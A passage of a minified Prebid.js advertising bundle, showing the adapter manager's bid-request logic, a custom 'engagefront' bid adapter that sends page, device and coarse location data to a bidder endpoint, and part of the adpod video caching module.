      if (i) return i.apply(void 0, n);
      u(e).before(function (e, t) {
        t.push(n), e(t);
      });
    };
    var r = n(48),
      i = n.n(r);
    function o(e) {
      return function (e) {
        if (Array.isArray(e)) return a(e);
      }(e) || function (e) {
        if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
      }(e) || function (e, t) {
        if (!e) return;
        if ("string" == typeof e) return a(e, t);
        var n = Object.prototype.toString.call(e).slice(8, -1);
        "Object" === n && e.constructor && (n = e.constructor.name);
        if ("Map" === n || "Set" === n) return Array.from(e);
        if ("Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return a(e, t);
      }(e) || function () {
        throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function a(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var n = 0, r = new Array(t); n < t; n++) r[n] = e[n];
      return r;
    }
    var c = i()({
        ready: i.a.SYNC | i.a.ASYNC | i.a.QUEUE
      }),
      u = c.get;
    var s = {};
  },
  862: function (e, t, n) {
    e.exports = n(37);
  },
  9: function (e, t, n) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), n.d(t, "gdprDataHandler", function () {
      return D;
    }), n.d(t, "uspDataHandler", function () {
      return k;
    }), n.d(t, "coppaDataHandler", function () {
      return N;
    }), n.d(t, "clientTestAdapters", function () {
      return P;
    }), n.d(t, "allS2SBidders", function () {
      return x;
    }), t.getAllS2SBidders = q, t.setS2STestingModule = function (e) {
      S = e;
    };
    var r = n(0),
      i = n(39),
      o = n(23),
      a = n(1),
      c = n(4),
      u = n(3),
      s = n(8),
      d = n(12),
      f = n.n(d),
      l = n(11),
      b = n.n(l),
      g = n(33),
      p = n(17);
    function y(e, t) {
      var n = Object.keys(e);
      if (Object.getOwnPropertySymbols) {
        var r = Object.getOwnPropertySymbols(e);
        t && (r = r.filter(function (t) {
          return Object.getOwnPropertyDescriptor(e, t).enumerable;
        })), n.push.apply(n, r);
      }
      return n;
    }
    function v(e) {
      for (var t = 1; t < arguments.length; t++) {
        var n = null != arguments[t] ? arguments[t] : {};
        t % 2 ? y(Object(n), !0).forEach(function (t) {
          m(e, t, n[t]);
        }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : y(Object(n)).forEach(function (t) {
          Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(n, t));
        });
      }
      return e;
    }
    function m(e, t, n) {
      return t in e ? Object.defineProperty(e, t, {
        value: n,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[t] = n, e;
    }
    function h(e, t) {
      return function (e) {
        if (Array.isArray(e)) return e;
      }(e) || function (e, t) {
        var n = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
        if (null == n) return;
        var r,
          i,
          o = [],
          a = !0,
          c = !1;
        try {
          for (n = n.call(e); !(a = (r = n.next()).done) && (o.push(r.value), !t || o.length !== t); a = !0);
        } catch (e) {
          c = !0, i = e;
        } finally {
          try {
            a || null == n.return || n.return();
          } finally {
            if (c) throw i;
          }
        }
        return o;
      }(e, t) || j(e, t) || function () {
        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function O(e) {
      return function (e) {
        if (Array.isArray(e)) return E(e);
      }(e) || function (e) {
        if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
      }(e) || j(e) || function () {
        throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function j(e, t) {
      if (e) {
        if ("string" == typeof e) return E(e, t);
        var n = Object.prototype.toString.call(e).slice(8, -1);
        return "Object" === n && e.constructor && (n = e.constructor.name), "Map" === n || "Set" === n ? Array.from(e) : "Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n) ? E(e, t) : void 0;
      }
    }
    function E(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var n = 0, r = new Array(t); n < t; n++) r[n] = e[n];
      return r;
    }
    function A() {
      return (A = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      }).apply(this, arguments);
    }
    var S,
      T = n(5),
      I = n(10),
      C = {},
      w = C.bidderRegistry = {},
      B = C.aliasRegistry = {},
      _ = [];
    u.b.getConfig("s2sConfig", function (e) {
      e && e.s2sConfig && (_ = Object(r.isArray)(e.s2sConfig) ? e.s2sConfig : [e.s2sConfig]);
    });
    var U = {};
    var R = Object(s.b)("sync", function (e) {
      var t = e.bidderCode,
        n = e.auctionId,
        a = e.bidderRequestId,
        c = e.adUnits,
        u = e.labels,
        s = e.src;
      return c.reduce(function (e, c) {
        var d = Object(i.b)(Object(i.a)(c, u), c.mediaTypes, c.sizes),
          f = d.active,
          l = d.mediaTypes,
          b = d.filterResults;
        return f ? b && Object(r.logInfo)('Size mapping filtered adUnit "'.concat(c.code, '" banner sizes from '), b.before, "to ", b.after) : Object(r.logInfo)('Size mapping disabled adUnit "'.concat(c.code, '"')), f && e.push(c.bids.filter(function (e) {
          return e.bidder === t;
        }).reduce(function (e, t) {
          var d = c.nativeParams || Object(r.deepAccess)(c, "mediaTypes.native");
          d && (t = A({}, t, {
            nativeParams: Object(o.h)(d)
          })), t = A({}, t, Object(r.getDefinedParams)(c, ["ortb2Imp", "mediaType", "renderer", "storedAuctionResponse"]));
          var f = Object(i.b)(Object(i.a)(t, u), l),
            b = f.active,
            p = f.mediaTypes,
            y = f.filterResults;
          return b ? y && Object(r.logInfo)('Size mapping filtered adUnit "'.concat(c.code, '" bidder "').concat(t.bidder, '" banner sizes from '), y.before, "to ", y.after) : Object(r.logInfo)('Size mapping deactivated adUnit "'.concat(c.code, '" bidder "').concat(t.bidder, '"')), Object(r.isValidMediaTypes)(p) ? t = A({}, t, {
            mediaTypes: p
          }) : Object(r.logError)("mediaTypes is not correctly configured for adunit ".concat(c.code)), b && e.push(A({}, t, {
            adUnitCode: c.code,
            transactionId: c.transactionId,
            sizes: Object(r.deepAccess)(p, "banner.sizes") || Object(r.deepAccess)(p, "video.playerSize") || [],
            bidId: t.bid_id || Object(r.getUniqueIdentifierStr)(),
            bidderRequestId: a,
            auctionId: n,
            src: s,
            bidRequestsCount: g.a.getRequestsCounter(c.code),
            bidderRequestsCount: g.a.getBidderRequestsCounter(c.code, t.bidder),
            bidderWinsCount: g.a.getBidderWinsCounter(c.code, t.bidder)
          })), e;
        }, [])), e;
      }, []).reduce(r.flatten, []).filter(function (e) {
        return "" !== e;
      });
    }, "getBids");
    var D = {
        consentData: null,
        setConsentData: function (e) {
          D.consentData = e;
        },
        getConsentData: function () {
          return D.consentData;
        }
      },
      k = {
        consentData: null,
        setConsentData: function (e) {
          k.consentData = e;
        },
        getConsentData: function () {
          return k.consentData;
        }
      },
      N = {
        getCoppa: function () {
          return !!u.b.getConfig("coppa");
        }
      },
      P = [],
      x = [];
    function q() {
      C.s2STestingEnabled = !1, _.forEach(function (e) {
        e && e.enabled && e.bidders && e.bidders.length && x.push.apply(x, O(e.bidders));
      });
    }
    function M(e) {
      return e && e.enabled && e.testing && S;
    }
    function G(e, t, n) {
      try {
        var i = w[e].getSpec();
        i && i[t] && "function" == typeof i[t] && (Object(r.logInfo)("Invoking ".concat(e, ".").concat(t)), u.b.runWithBidder(e, r.bind.call(i[t], i, n)));
      } catch (n) {
        Object(r.logWarn)("Error calling ".concat(t, " of ").concat(e));
      }
    }
    C.makeBidRequests = Object(s.b)("sync", function (e, t, n, i, o) {
      I.emit(T.EVENTS.BEFORE_REQUEST_BIDS, e);
      var a = Object(r.getBidderCodes)(e);
      u.b.getConfig("bidderSequence") === u.a && (a = Object(r.shuffle)(a));
      var c = Object(p.a)(),
        s = a,
        d = [];
      0 === x.length && q(), _.forEach(function (t) {
        t && t.enabled && M(t) && (S.calculateBidSources(t), S.getSourceBidderMap(e, x)[S.CLIENT].forEach(function (e) {
          f()(P, e) || P.push(e);
        }));
      }), s = a.filter(function (e) {
        return !f()(x, e) || f()(P, e);
      });
      var l = x;
      _.forEach(function (i) {
        if (i && i.enabled) {
          (function (e) {
            return Boolean(M(e) && e.testServerOnly);
          })(i) && function (e, t) {
            return Boolean(b()(e, function (e) {
              return b()(e.bids, function (e) {
                return (e.bidSource || t.bidderControl && t.bidderControl[e.bidder]) && e.finalSource === S.SERVER;
              });
            }));
          }(e, i) && (Object(r.logWarn)("testServerOnly: True.  All client requests will be suppressed."), s.length = 0);
          var a = function (e, t) {
              var n = t.bidders,
                i = Object(r.deepClone)(e);
              return i.forEach(function (e) {
                e.bids = e.bids.filter(function (e) {
                  return f()(n, e.bidder) && (!M(t) || e.finalSource !== S.CLIENT);
                }).map(function (e) {
                  return e.bid_id = Object(r.getUniqueIdentifierStr)(), e;
                });
              }), i.filter(function (e) {
                return 0 !== e.bids.length;
              });
            }(e, i),
            u = Object(r.generateUUID)();
          l.forEach(function (e) {
            var s = Object(r.getUniqueIdentifierStr)(),
              f = {
                bidderCode: e,
                auctionId: n,
                bidderRequestId: s,
                uniquePbsTid: u,
                bids: R({
                  bidderCode: e,
                  auctionId: n,
                  bidderRequestId: s,
                  adUnits: Object(r.deepClone)(a),
                  labels: o,
                  src: T.S2S.SRC
                }),
                auctionStart: t,
                timeout: i.timeout,
                src: T.S2S.SRC,
                refererInfo: c
              };
            0 !== f.bids.length && d.push(f);
          }), a.forEach(function (e) {
            var t = e.bids.filter(function (e) {
              return b()(d, function (t) {
                return b()(t.bids, function (t) {
                  return t.bidId === e.bid_id;
                });
              });
            });
            e.bids = t;
          }), d.forEach(function (e) {
            void 0 === e.adUnitsS2SCopy && (e.adUnitsS2SCopy = a.filter(function (e) {
              return e.bids.length > 0;
            }));
          });
        }
      });
      var g = function (e) {
        var t = Object(r.deepClone)(e);
        return t.forEach(function (e) {
          e.bids = e.bids.filter(function (e) {
            return !P.length || e.finalSource !== S.SERVER;
          });
        }), t.filter(function (e) {
          return 0 !== e.bids.length;
        });
      }(e);
      return s.forEach(function (e) {
        var a = Object(r.getUniqueIdentifierStr)(),
          u = {
            bidderCode: e,
            auctionId: n,
            bidderRequestId: a,
            bids: R({
              bidderCode: e,
              auctionId: n,
              bidderRequestId: a,
              adUnits: Object(r.deepClone)(g),
              labels: o,
              src: "client"
            }),
            auctionStart: t,
            timeout: i,
            refererInfo: c
          },
          s = w[e];
        s || Object(r.logError)("Trying to make a request for bidder that does not exist: ".concat(e)), s && u.bids && 0 !== u.bids.length && d.push(u);
      }), D.getConsentData() && d.forEach(function (e) {
        e.gdprConsent = D.getConsentData();
      }), k.getConsentData() && d.forEach(function (e) {
        e.uspConsent = k.getConsentData();
      }), d;
    }, "makeBidRequests"), C.callBids = function (e, t, n, i, o, a, s) {
      if (t.length) {
        var d = h(t.reduce(function (e, t) {
            return e[Number(void 0 !== t.src && t.src === T.S2S.SRC)].push(t), e;
          }, [[], []]), 2),
          l = d[0],
          b = d[1],
          g = [];
        b.forEach(function (e) {
          for (var t = -1, n = 0; n < g.length; ++n) if (e.uniquePbsTid === g[n].uniquePbsTid) {
            t = n;
            break;
          }
          t <= -1 && g.push(e);
        });
        var p = 0,
          y = Object(r.generateUUID)();
        _.forEach(function (e) {
          if (e && g[p] && f()(e.bidders, g[p].bidderCode)) {
            var t = Object(c.b)(a, o ? {
                request: o.request.bind(null, "s2s"),
                done: o.done
              } : void 0),
              u = e.bidders,
              s = w[e.adapter],
              d = g[p].uniquePbsTid,
              l = g[p].adUnitsS2SCopy,
              m = b.filter(function (e) {
                return e.uniquePbsTid === d;
              });
            if (s) {
              var h = {
                tid: y,
                ad_units: l,
                s2sConfig: e
              };
              if (h.ad_units.length) {
                var O = m.map(function (e) {
                    return e.start = Object(r.timestamp)(), i.bind(e);
                  }),
                  j = h.ad_units.reduce(function (e, t) {
                    return e.concat((t.bids || []).reduce(function (e, t) {
                      return e.concat(t.bidder);
                    }, []));
                  }, []);
                Object(r.logMessage)("CALLING S2S HEADER BIDDERS ==== ".concat(u.filter(function (e) {
                  return f()(j, e);
                }).join(","))), m.forEach(function (e) {
                  I.emit(T.EVENTS.BID_REQUESTED, v(v({}, e), {}, {
                    tid: y
                  }));
                }), s.callBids(h, b, function (e, t) {
                  var i = Object(r.getBidderRequest)(b, t.bidderCode, e);
                  i && n.call(i, e, t);
                }, function () {
                  return O.forEach(function (e) {
                    return e();
                  });
                }, t);
              }
            } else Object(r.logError)("missing " + e.adapter);
            p++;
          }
        }), l.forEach(function (e) {
          e.start = Object(r.timestamp)();
          var t = w[e.bidderCode];
          u.b.runWithBidder(e.bidderCode, function () {
            Object(r.logMessage)("CALLING BIDDER"), I.emit(T.EVENTS.BID_REQUESTED, e);
          });
          var d = Object(c.b)(a, o ? {
              request: o.request.bind(null, e.bidderCode),
              done: o.done
            } : void 0),
            f = i.bind(e);
          try {
            u.b.runWithBidder(e.bidderCode, r.bind.call(t.callBids, t, e, n.bind(e), f, d, s, u.b.callbackWithBidder(e.bidderCode)));
          } catch (t) {
            Object(r.logError)("".concat(e.bidderCode, " Bid Adapter emitted an uncaught error when parsing their bidRequest"), {
              e: t,
              bidRequest: e
            }), f();
          }
        });
      } else Object(r.logWarn)("callBids executed with no bidRequests.  Were they filtered by labels or sizing?");
    }, C.videoAdapters = [], C.registerBidAdapter = function (e, t) {
      var n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
        i = n.supportedMediaTypes,
        a = void 0 === i ? [] : i;
      e && t ? "function" == typeof e.callBids ? (w[t] = e, f()(a, "video") && C.videoAdapters.push(t), f()(a, "native") && o.f.push(t)) : Object(r.logError)("Bidder adaptor error for bidder code: " + t + "bidder must implement a callBids() function") : Object(r.logError)("bidAdapter or bidderCode not specified");
    }, C.aliasBidAdapter = function (e, t, n) {
      if (void 0 === w[t]) {
        var i = w[e];
        if (void 0 === i) {
          var c = [];
          _.forEach(function (n) {
            if (n.bidders && n.bidders.length) {
              var r = n && n.bidders;
              n && f()(r, t) ? B[t] = e : c.push(e);
            }
          }), c.forEach(function (e) {
            Object(r.logError)('bidderCode "' + e + '" is not an existing bidder.', "adapterManager.aliasBidAdapter");
          });
        } else try {
          var u,
            s = function (e) {
              var t = [];
              return f()(C.videoAdapters, e) && t.push("video"), f()(o.f, e) && t.push("native"), t;
            }(e);
          if (i.constructor.prototype != Object.prototype) (u = new i.constructor()).setBidderCode(t);else {
            var d = i.getSpec(),
              l = n && n.gvlid,
              b = n && n.skipPbsAliasing;
            u = Object(a.newBidder)(A({}, d, {
              code: t,
              gvlid: l,
              skipPbsAliasing: b
            })), B[t] = e;
          }
          C.registerBidAdapter(u, t, {
            supportedMediaTypes: s
          });
        } catch (t) {
          Object(r.logError)(e + " bidder does not currently support aliasing.", "adapterManager.aliasBidAdapter");
        }
      } else Object(r.logMessage)('alias name "' + t + '" has been already specified.');
    }, C.registerAnalyticsAdapter = function (e) {
      var t = e.adapter,
        n = e.code,
        i = e.gvlid;
      t && n ? "function" == typeof t.enableAnalytics ? (t.code = n, U[n] = {
        adapter: t,
        gvlid: i
      }) : Object(r.logError)('Prebid Error: Analytics adaptor error for analytics "'.concat(n, '"\n        analytics adapter must implement an enableAnalytics() function')) : Object(r.logError)("Prebid Error: analyticsAdapter or analyticsCode not specified");
    }, C.enableAnalytics = function (e) {
      Object(r.isArray)(e) || (e = [e]), Object(r._each)(e, function (e) {
        var t = U[e.provider].adapter;
        t ? t.enableAnalytics(e) : Object(r.logError)("Prebid Error: no analytics adapter found in registry for\n        ".concat(e.provider, "."));
      });
    }, C.getBidAdapter = function (e) {
      return w[e];
    }, C.getAnalyticsAdapter = function (e) {
      return U[e];
    }, C.callTimedOutBidders = function (e, t, n) {
      t = t.map(function (t) {
        return t.params = Object(r.getUserConfiguredParams)(e, t.adUnitCode, t.bidder), t.timeout = n, t;
      }), t = Object(r.groupBy)(t, "bidder"), Object.keys(t).forEach(function (e) {
        G(e, "onTimeout", t[e]);
      });
    }, C.callBidWonBidder = function (e, t, n) {
      t.params = Object(r.getUserConfiguredParams)(n, t.adUnitCode, t.bidder), g.a.incrementBidderWinsCounter(t.adUnitCode, t.bidder), G(e, "onBidWon", t);
    }, C.callSetTargetingBidder = function (e, t) {
      G(e, "onSetTargeting", t);
    }, C.callBidViewableBidder = function (e, t) {
      G(e, "onBidViewable", t);
    }, C.callBidderError = function (e, t, n) {
      G(e, "onBidderError", {
        error: t,
        bidderRequest: n
      });
    }, t.default = C;
  }
});
var twnGetDeviceType = function () {
  return platform == 'mobile' ? 4 : typeof window.orientation !== "undefined" && window.orientation !== false || navigator.userAgent.indexOf('IEMobile') !== -1 ? 5 : 2;
};
pbjsChunk([145], {
  207: function (e, t, i) {
    e.exports = i(208);
  },
  208: function (e, t, i) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), i.d(t, "spec", function () {
      return a;
    });
    var g = i(0),
      r = i(1),
      d = i(2),
      m = i(3),
      n = "engagefront",
      b = {
        validateSizes: function (e) {
          return !(!g.isArray(e) || void 0 === e[0]) && e.every(function (e) {
            return g.isArray(e) && 2 === e.length;
          });
        }
      },
      a = {
        code: n,
        supportedMediaTypes: [d.b],
        isBidRequestValid: function (e) {
          return true;
        },
        buildRequests: function (e, t) {
          var i = window.location,
            r = i.host,
            d = i.href,
            n = i.protocol,
            a = {},
            s = [],
            o = t.auctionId,
            p = 1000,
            u = Date.now(),
            c = location.protocol + "//twngcpbidder.lb.engagecore.com:443?t=" + p + "&ts=" + u,
            l = -1 < n.indexOf("https") ? 1 : 0;
          return g._each(e, function (e) {
            var t = g.getBidIdParameter("tagid", e.params),
              i = parseFloat(g.getBidIdParameter("bidfloor", e.params)) || 0,
              r = e.mediaTypes.banner.sizes;
            b.validateSizes(r) || (r = e.sizes);
            var d = {
              id: e.bidId,
              tid: e.transactionId,
              tagid: t,
              secure: l,
              banner: {
                format: r.map(function (e) {
                  return {
                    w: e[0],
                    h: e[1]
                  };
                }),
                w: r[0][0],
                h: r[0][1]
              }
            };
            0 < i && (d.bidfloor = i), s.push(d);
          }), a = {
            id: o,
            imp: s,
            site: {
              domain: r,
              page: d
            }
          }, t.gdprConsent && (a.regs = {
            ext: {
              gdpr: !0 === t.gdprConsent.gdprApplies ? 1 : 0
            }
          }), t.gdprConsent && t.gdprConsent.gdprApplies && (a.user = {
            ext: {
              consent: t.gdprConsent.consentString
            }
          }), {
            method: "POST",
            url: c,
            data: JSON.stringify({
              id: e[0].bidId,
              device: {
                ua: navigator.userAgent,
                twn_id: window.twn_id,
                geo: {
                  country: typeof window._user_config['country'] !== "undefined" ? window._user_config['country'].toUpperCase() : "",
                  city: typeof window._user_config['name'] !== "undefined" ? window._user_config['name'].toUpperCase() : "",
                  zip: typeof window._user_config['ip_postalcode'] !== "undefined" ? window._user_config['name'].replace(/\s/g, '').toUpperCase : "",
                  region: typeof window._user_config['prov'] !== "undefined" ? window._user_config['prov'].toUpperCase() : "",
                  type: 2,
                  utcoffset: "-" + new Date().getTimezoneOffset()
                },
                language: typeof window.dfp_user_locale !== "undefined" ? window.dfp_user_locale.substring(0, 2).toUpperCase() : "",
                devicetype: twnGetDeviceType()
              },
              imp: a.imp[0],
              site: {
                cat: ["IAB15-10"],
                page: window.location.href,
                content: {},
                id: "000001",
                publisher: {
                  id: "000001_1"
                }
              },
              ext: {
                ssl: l,
                sdepth: 9,
                tz: new Date().getTimezoneOffset(),
                edepth: 12
              }
            }),
            options: {
              withCredentials: !0
            }
          };
        },
        interpretResponse: function (e) {
          var t = [],
            i = e.body || {};
          return i.seatbid && 0 < i.seatbid.length && i.seatbid[0].bid && i.seatbid.forEach(function (e) {
            e = e.bid[0],
            //console.log("aaaaaa", r);
            t.push({
              requestId: e.id,
              cpm: e.price,
              width: e.width,
              height: e.height,
              creativeId: e.crid,
              dealId: e.dealid || null,
              currency: "USD",
              netRevenue: !0,
              mediaType: d.a,
              ad: e.adm,
              ttl: 3500
            });
          }), t;
        }
      };
    Object(r.registerBidder)(a);
  }
}, [207]);
pbjsChunk([380], {
  104: function (e, t, i) {
    e.exports = i(105);
  },
  105: function (e, t, i) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.callPrebidCacheHook = D, t.checkAdUnitSetupHook = U, t.checkVideoBidSetupHook = B, t.adpodSetConfig = k, t.callPrebidCacheAfterAuction = R, t.sortByPricePerSecond = K, t.getTargeting = P;
    var n = i(0),
      a = i(19),
      r = i(37),
      o = i(16),
      c = i(8),
      d = i(40),
      u = i(3),
      s = i(2),
      l = i(11),
      f = i.n(l),
      b = i(18),
      g = i(5),
      p = i.n(g);
    function v() {
      return (v = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var i = arguments[t];
          for (var n in i) Object.prototype.hasOwnProperty.call(i, n) && (e[n] = i[n]);
        }
        return e;
      }).apply(this, arguments);
    }
    function h(e, t, i) {
      return t in e ? Object.defineProperty(e, t, {
        value: i,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[t] = i, e;
    }
    function y(e, t) {
      return function (e) {
        if (Array.isArray(e)) return e;
      }(e) || function (e, t) {
        var i = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
        if (null == i) return;
        var n,
          a,
          r = [],
          o = !0,
          c = !1;
        try {
          for (i = i.call(e); !(o = (n = i.next()).done) && (r.push(n.value), !t || r.length !== t); o = !0);
        } catch (e) {
          c = !0, a = e;
        } finally {
          try {
            o || null == i.return || i.return();
          } finally {
            if (c) throw a;
          }
        }
        return r;
      }(e, t) || j(e, t) || function () {
        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function m(e) {
      return function (e) {
        if (Array.isArray(e)) return O(e);
      }(e) || function (e) {
        if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
      }(e) || j(e) || function () {
        throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function j(e, t) {
      if (e) {
        if ("string" == typeof e) return O(e, t);
        var i = Object.prototype.toString.call(e).slice(8, -1);
        return "Object" === i && e.constructor && (i = e.constructor.name), "Map" === i || "Set" === i ? Array.from(e) : "Arguments" === i || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(i) ? O(e, t) : void 0;
      }
    }
    function O(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var i = 0, n = new Array(t); i < t; i++) n[i] = e[i];
      return n;
    }
    var T = i(32),
      C = "hb_pb_cat_dur",
      S = "hb_cache_id",
      A = 50,
      _ = 5,
      I = function () {
        var e = {};
        function t(t) {
          var i, a, r;
          e[t] = {}, e[t].bidStorage = new Set(), e[t].queueDispatcher = (i = A, r = 1, function (e, t, n, o) {
            var c = this,
              d = function () {
                w.call(c, e, t, n);
              };
            clearTimeout(a), o ? r = 1 : r === _ ? (r = 1, d()) : (r++, a = setTimeout(d, i));
          }), e[t].initialCacheKey = Object(n.generateUUID)();
        }
        return {
          addBid: function (i) {
            e[i.auctionId] || t(i.auctionId), e[i.auctionId].bidStorage.add(i);
          },
          removeBid: function (t) {
            e[t.auctionId].bidStorage.delete(t);
          },
          getBids: function (t) {
            return e[t.auctionId] && e[t.auctionId].bidStorage.values();
          },
          getQueueDispatcher: function (t) {
            return e[t.auctionId] && e[t.auctionId].queueDispatcher;
          },
          setupInitialCacheKey: function (t) {
            e[t.auctionId] || (e[t.auctionId] = {}, e[t.auctionId].initialCacheKey = Object(n.generateUUID)());
          },
          getInitialCacheKey: function (t) {
            return e[t.auctionId] && e[t.auctionId].initialCacheKey;
          }
        };
      }();
    function E(e, t) {
      var i,
        r = I.getInitialCacheKey(e),
        o = Object(n.deepAccess)(e, "video.durationBucket"),
        c = function (e) {
          var t;
          if (u.b.getConfig("adpod.prioritizeDeals") && Object(n.deepAccess)(e, "video.dealTier")) {
            var i = u.b.getConfig("adpod.dealTier.".concat(e.bidderCode, ".prefix"));
            t = i ? i + Object(n.deepAccess)(e, "video.dealTier") : Object(n.deepAccess)(e, "video.dealTier");
          } else {
            var r = Object(a.i)(e.mediaType);
            t = Object(a.h)(r)(e);
          }
          return t;
        }(e);
      if (t) {
        var d = Object(n.deepAccess)(e, "meta.adServerCatId");
        i = "".concat(c, "_").concat(d, "_").concat(o, "s");
      } else i = "".concat(c, "_").concat(o, "s");
      e.adserverTargeting || (e.adserverTargeting = {}), e.adserverTargeting.hb_pb_cat_dur = i, e.adserverTargeting.hb_cache_id = r, e.videoCacheKey = r, e.customCacheKey = "".concat(i, "_").concat(r);
    }
    function w(e, t, i) {
      !function (e) {
        for (var t = 0; t < e.length; t++) I.removeBid(e[t]);
      }(t), Object(d.b)(t, function (r, o) {
        if (r) {
          Object(n.logWarn)("Failed to save to the video cache: ".concat(r, ". Video bid(s) must be discarded."));
          for (var c = 0; c < t.length; c++) Object(a.g)(e, t[c]);
        } else for (var d = 0; d < o.length; d++) "" !== o[d].uuid ? Object(a.d)(e, t[d]) : Object(n.logInfo)("Detected a bid was not cached because the custom key was already registered.  Attempted to use key: ".concat(t[d].customCacheKey, ". Bid was: "), t[d]), i();
      });
    }
    function D(e, t, i, r, o) {
      var c = Object(n.deepAccess)(o, "mediaTypes.video");
      if (c && c.context === s.a) {
        var d = u.b.getConfig("adpod.brandCategoryExclusion");
        !Object(n.deepAccess)(i, "meta.adServerCatId") && d ? (Object(n.logWarn)("Detected a bid without meta.adServerCatId while setConfig({adpod.brandCategoryExclusion}) was enabled.  This bid has been rejected:", i), r()) : !1 === u.b.getConfig("adpod.deferCaching") ? (I.addBid(i), E(i, d), function (e, t, i) {
          var r = I.getBids(t);
          if (r) {
            var o = T(r),
              c = I.getQueueDispatcher(t),
              d = !(e.getAuctionStatus() === a.b);
            c(e, o, i, d);
          } else Object(n.logWarn)("Attempted to cache a bid from an unknown auction. Bid:", t);
        }(t, i, r)) : (I.setupInitialCacheKey(i), E(i, d), Object(a.d)(t, i), r());
      } else e.call(this, t, i, r, o);
    }
    function U(e, t) {
      var i = t.filter(function (e) {
        var t = Object(n.deepAccess)(e, "mediaTypes"),
          i = Object(n.deepAccess)(t, "video");
        if (i && i.context === s.a) {
          if (Object.keys(t).length > 1) return Object(n.logWarn)("Detected more than one mediaType in adUnitCode: ".concat(e.code, " while attempting to define an 'adpod' video adUnit.  'adpod' adUnits cannot be mixed with other mediaTypes.  This adUnit will be removed from the auction.")), !1;
          var a = "Detected missing or incorrectly setup fields for an adpod adUnit.  Please review the following fields of adUnitCode: ".concat(e.code, ".  This adUnit will be removed from the auction."),
            r = !!(i.playerSize && (Object(n.isArrayOfNums)(i.playerSize, 2) || Object(n.isArray)(i.playerSize) && i.playerSize.every(function (e) {
              return Object(n.isArrayOfNums)(e, 2);
            })) || i.sizeConfig),
            o = !!(i.adPodDurationSec && Object(n.isNumber)(i.adPodDurationSec) && i.adPodDurationSec > 0),
            c = !!(i.durationRangeSec && Object(n.isArrayOfNums)(i.durationRangeSec) && i.durationRangeSec.every(function (e) {
              return e > 0;
            }));
          if (!r || !o || !c) return a += r ? "" : "\nmediaTypes.video.playerSize", a += o ? "" : "\nmediaTypes.video.adPodDurationSec", a += c ? "" : "\nmediaTypes.video.durationRangeSec", Object(n.logWarn)(a), !1;
        }
        return !0;
      });
      t = i, e.call(this, t);
    }
    function B(e, t, i, a, r) {
      if (r === s.a) {
        var o = !0;
        if (u.b.getConfig("adpod.brandCategoryExclusion") && !Object(n.deepAccess)(t, "meta.primaryCatId") && (o = !1), Object(n.deepAccess)(t, "video")) if (Object(n.deepAccess)(t, "video.context") && t.video.context === s.a || (o = !1), !Object(n.deepAccess)(t, "video.durationSeconds") || t.video.durationSeconds <= 0) o = !1;else (function (e, t) {
          var i = Object(n.deepAccess)(t, "video.durationSeconds"),
            a = Object(n.deepAccess)(e, "mediaTypes.video"),
            r = a.durationRangeSec;
          if (r.sort(function (e, t) {
            return e - t;
          }), a.requireExactDuration) {
            if (!f()(r, function (e) {
              return e === i;
            })) return Object(n.logWarn)("Detected a bid with a duration value not part of the list of accepted ranges specified in adUnit.mediaTypes.video.durationRangeSec.  Exact match durations must be used for this adUnit. Rejecting bid: ", t), !1;
            t.video.durationBucket = i;
          } else {
            var o = Math.max.apply(Math, m(r));
            if (!(i <= o + 2)) return Object(n.logWarn)("Detected a bid with a duration value outside the accepted ranges specified in adUnit.mediaTypes.video.durationRangeSec.  Rejecting bid: ", t), !1;
            var c = f()(r, function (e) {
              return e + 2 >= i;
            });
            t.video.durationBucket = c;
          }
          return !0;
        })(i, t) || (o = !1);
        u.b.getConfig("cache.url") || !t.vastXml || t.vastUrl || (Object(n.logError)('\n        This bid contains only vastXml and will not work when a prebid cache url is not specified.\n        Try enabling prebid cache with pbjs.setConfig({ cache: {url: "..."} });\n      '), o = !1), e.bail(o);
      } else e.call(this, t, i, a, r);
    }
    function k(e) {
